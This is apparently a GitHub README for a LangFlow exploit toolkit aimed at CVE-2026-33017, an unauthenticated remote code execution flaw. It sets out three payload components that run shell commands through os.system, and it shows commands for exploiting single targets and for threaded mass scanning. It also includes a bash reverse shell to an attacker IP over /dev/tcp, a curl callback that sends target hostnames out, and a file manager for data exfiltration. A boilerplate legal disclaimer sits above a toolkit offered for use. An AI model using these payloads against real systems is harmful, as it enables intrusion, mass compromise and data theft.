<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=32&duration=2800&pause=2000&color=F75C7E&center=true&vCenter=true&width=940&lines=LangFlow+Unauthenticated+RCE;%F0%9F%94%A5+CVE-2026-33017+Exploit+Toolkit+%F0%9F%94%A5;3+Variants+%7C+Diagnostic+%7C+File+Manager" alt="Typing SVG" />

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg?style=for-the-badge)
![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg?style=for-the-badge&logo=python&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green.svg?style=for-the-badge)
![Status](https://img.shields.io/badge/status-active-brightgreen.svg?style=for-the-badge)

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcWJ6Mmd6Ym1uNGZ4Z3R4bWZ4Z3R4bWZ4Z3R4bWZ4Z3R4JmVuY3J5cHRlZD1pZD1ncGh5czJ6eTZ5NnN6eTZ5NnN6eTZ5JnN0PXByb2R1Y3Rpb25fZW1haWwmY3Q9Zw" width="600">

</div>

---

<div align="center">

## 🚨 **LEGAL DISCLAIMER** 🚨

> ⚠️ **This tool is intended for EDUCATIONAL purposes and AUTHORIZED penetration testing ONLY.**
> Using this tool on systems without prior written authorization is **ILLEGAL**.
> The author (**HACKFUT**) assumes no responsibility for any misuse.
> **Use it responsibly!** 🛡️

</div>

---

## 📋 **Table of Contents**

- [🔍 Description](#-description)
- [✨ Features](#-features)
- [⚙️ Prerequisites](#️-prerequisites)
- [🚀 Installation](#-installation)
- [💻 Usage](#-usage)
- [🧪 Diagnostic](#-diagnostic)
- [🎯 Exploit Variants](#-exploit-variants)
- [📊 Examples](#-examples)
- [🛡️ Credits](#️-credits)
- [📜 License](#-license)

---

## 🔍 **Description**

**LangFlow-RCE** is a complete exploitation toolkit for the **CVE-2026-33017** vulnerability affecting exposed **LangFlow** instances. This vulnerability allows **unauthenticated Remote Code Execution (RCE)** through the `/api/v1/build_public_tmp/{flow_id}/flow` endpoint.

The tool provides:
- ✅ **3 payload variants** to maximize success chances
- 🔬 **Complete diagnostic script** to identify defense mechanisms
- 🖥️ **File manager** for data exfiltration
- ⚡ **Multi-thread support** for mass scanning
- 🎨 **Colorful and readable** interface

---

## ✨ **Features**

| Feature | Description |
|---------|-------------|
| 🔐 **Auto-Login Bypass** | Automatically retrieves a token via `/api/v1/auto_login` |
| 📦 **Public Flow Creation** | Automatically creates a PUBLIC flow if needed |
| 🎯 **3 Payload Variants** | Module-level exec, input trigger, and minimal |
| 🔍 **Smart Polling** | Analyzes NDJSON events to validate execution |
| 🧹 **Automatic Cleanup** | Deletes created flows after exploitation |
| 🖥️ **File Manager** | Upload/download files via LangFlow API |
| 🔬 **Full Diagnostic** | 9 tests to understand target behavior |
| ⚡ **Multi-Threading** | Parallel scanning of multiple targets |
| 📊 **Colorful Summary** | Clear and readable final statistics |

---

## ⚙️ **Prerequisites**

- 🐍 **Python 3.8+**
- 📦 **pip** (Python package manager)

### Dependencies

```bash
pip install requests colorama
```

---

## 🚀 **Installation**

```bash
# 1. Clone the repository
git clone https://github.com/HackfutSecRoot/LangFlow-Rce.git
cd LangFlow-Rce

# 2. Install dependencies
pip install -r requirements.txt

# 3. Make scripts executable
chmod +x exploit.py diagnose.py
```

---

## 💻 **Usage**

### 🔥 **Basic Exploitation**

```bash
# Single target with default command (id)
python3 exploit.py --url http://target:7860

# Single target with custom command
python3 exploit.py --url http://target:7860 --cmd "whoami"

# Verbose mode for details
python3 exploit.py --url http://target:7860 --cmd "uname -a" -v
```

### 📁 **Mass Scanning**

```bash
# From a targets file
python3 exploit.py --url-file targets.txt --cmd "id" --threads 10

# targets.txt format (one URL per line)
# http://192.168.1.10:7860
# http://192.168.1.11:7860
# https://langflow.example.com
```

### 🎯 **Custom Flow ID**

```bash
# Use an existing PUBLIC flow
python3 exploit.py --url http://target:7860 --flow-id "abc-123-def" --cmd "id"
```

### 🧹 **Cleanup Options**

```bash
# Do not delete created flows (for analysis)
python3 exploit.py --url http://target:7860 --no-cleanup
```

---

## 🧪 **Diagnostic**

The `diagnose.py` script performs an in-depth analysis of a target's behavior:

```bash
# Basic diagnostic
python3 diagnose.py http://target:7860

# With callback test (listener)
python3 diagnose.py http://target:7860 http://YOUR_IP:PORT
```

### 📋 **Performed Tests**

| # | Test | Description |
|---|------|-------------|
| 1 | **Version** | Retrieves LangFlow version |
| 2 | **Auto-Login** | Tests token retrieval |
| 3 | **Flow Creation** | Creates a test PUBLIC flow |
| 4 | **Empty Flow** | Baseline (empty flow) |
| 5 | **Simple Print** | Tests `print('HELLO')` |
| 6 | **os.system** | Tests system execution |
| 7 | **exec()** | Tests the exec function |
| 8 | **__import__** | Tests dynamic import |
| 9 | **Base64 + exec** | Tests obfuscation |

---

## 🎯 **Exploit Variants**

### **Variant 1: Module-level exec (Original)**

```python
from langflow.custom import Component
from langflow.io import Output

_r = __import__('os').system('COMMAND')

class ExploitComponent(Component):
    display_name = "ExploitComponent"
    description  = "CVE-2026-33017 PoC"
    outputs = [Output(display_name="Result", name="output", method="run")]

    def run(self) -> str:
        return "ok"
```

**Advantages:** Executes at module load time (before instantiation)

---

### **Variant 2: With input trigger**

```python
import os
from langflow.custom import Component
from langflow.io import Output, MessageTextInput

_r = os.system('COMMAND')

class ExploitComponent(Component):
    display_name = "ExploitComponent"
    inputs = [MessageTextInput(name="input_value", display_name="Input")]
    outputs = [Output(display_name="Result", name="output", method="run")]

    def run(self, input_value: str = "") -> str:
        return "ok"
```

**Advantages:** Compatible with flows requiring inputs

---

### **Variant 3: Minimal (without langflow.io)**

```python
import os
from langflow.custom import Component

_r = os.system('COMMAND')

class ExploitComponent(Component):
    display_name = "ExploitComponent"

    def build(self):
        return "ok"
```

**Advantages:** Minimalist, bypasses certain import restrictions

---

## 📊 **Examples**

### 🎯 **Example 1: Simple scan**

```bash
$ python3 exploit.py --url http://10.10.10.50:7860 --cmd "id"

  ╔══════════════════════════════════════════════════════════════════╗
  ║  Langflow Unauthenticated RCE                                     ║
  ║  3 Variants + Diagnostic + File Manager                          ║
  ║  Original: HACKFUT                                               ║
  ╚══════════════════════════════════════════════════════════════════╝

  Targets: 1
  Command: id
  Threads: 5

  [+] [http://10.10.10.50:7860] token obtained
  [+] [http://10.10.10.50:7860] public flow: abc-123-def
  [+] [http://10.10.10.50:7860] VULNERABLE - RCE executed

  ============================================================
  VULNERABLE: 1 | FAILED: 0 | ERROR: 0
  ============================================================
```

---

### 🎯 **Example 2: Reverse Shell**

```bash
# On your machine (listener)
nc -lvnp 4444

# On the target
python3 exploit.py --url http://target:7860 --cmd "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

---

### 🎯 **Example 3: Mass scan with threads**

```bash
python3 exploit.py --url-file targets.txt --cmd "curl http://YOUR_IP/$(hostname)" --threads 20 -v
```

---

### 🎯 **Example 4: Full diagnostic**

```bash
$ python3 diagnose.py http://target:7860 http://YOUR_IP:8080

[1] Version:
    {"version": "1.0.0"}

[2] auto_login:
    Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[3] Creating flow:
    Flow ID: diag-a1b2c3d4

============================================================
  Test: EMPTY FLOW (baseline)
============================================================
  POST: HTTP 200
  Job ID: job-xyz-123
  Polling events...
  [end_vertex]
    valid: True
  ✅ BUILD VALID

============================================================
  Test: SIMPLE PRINT
============================================================
  POST: HTTP 200
  Job ID: job-xyz-124
  Polling events...
  [end_vertex]
    valid: True
  ✅ BUILD VALID

...
```

---

## 🛡️ **Credits**

- 🎯 **HACKFUT** - Original exploit author
- 🐍 **LangFlow Team** - For the (vulnerable) platform
- 🌍 **Security Community** - For knowledge sharing

---

## 📜 **License**

```
MIT License

Copyright (c) 2026 HACKFUT

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

<div align="center">

## ⭐ **If this project helped you, give it a star!** ⭐

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&duration=3000&pause=1000&color=F75C7E&center=true&vCenter=true&width=600&lines=Thanks+for+your+support+%F0%9F%99%8F;HACKFUT+Security+Research" alt="Typing SVG" />

<br/>

<a href="https://github.com/HackfutSecRoot/LangFlow-Rce/stargazers">
  <img src="https://img.shields.io/github/stars/HackfutSecRoot/LangFlow-Rce?style=social" alt="Stars">
</a>
<a href="https://github.com/HackfutSecRoot/LangFlow-Rce/network/members">
  <img src="https://img.shields.io/github/forks/HackfutSecRoot/LangFlow-Rce?style=social" alt="Forks">
</a>
<a href="https://github.com/HackfutSecRoot/LangFlow-Rce/issues">
  <img src="https://img.shields.io/github/issues/HackfutSecRoot/LangFlow-Rce?style=social" alt="Issues">
</a>

<br/><br/>

**Made with ❤️ by [HACKFUT](https://github.com/HackfutSecRoot)**

</div>
```

---

## 📝 **`requirements.txt` File**

Don't forget to add this file:

```txt
requests>=2.28.0
colorama>=0.4.6
```
